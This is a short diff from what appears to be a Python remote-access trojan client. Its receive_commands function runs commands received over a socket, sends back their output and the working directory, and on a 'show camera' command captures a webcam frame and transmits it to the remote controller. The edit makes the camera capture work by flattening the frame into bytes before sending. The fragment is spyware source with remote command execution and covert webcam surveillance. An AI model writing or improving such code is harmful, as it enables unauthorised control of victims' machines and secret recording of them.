@@ -134,10 +134,11 @@ def receive_commands():
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
             elif data.decode("utf-8").__contains__('show camera'):
-                while True:
-                    video = cv2.VideoCapture(0)
-                    check, frame = video.read()
-                    s.send(frame)
+                video = cv2.VideoCapture(0)
+                check, frame = video.read()
+                ddd = frame.flatten()
+                sss = ddd.tostring()
+                s.send(sss)
 
             else:
                 try:
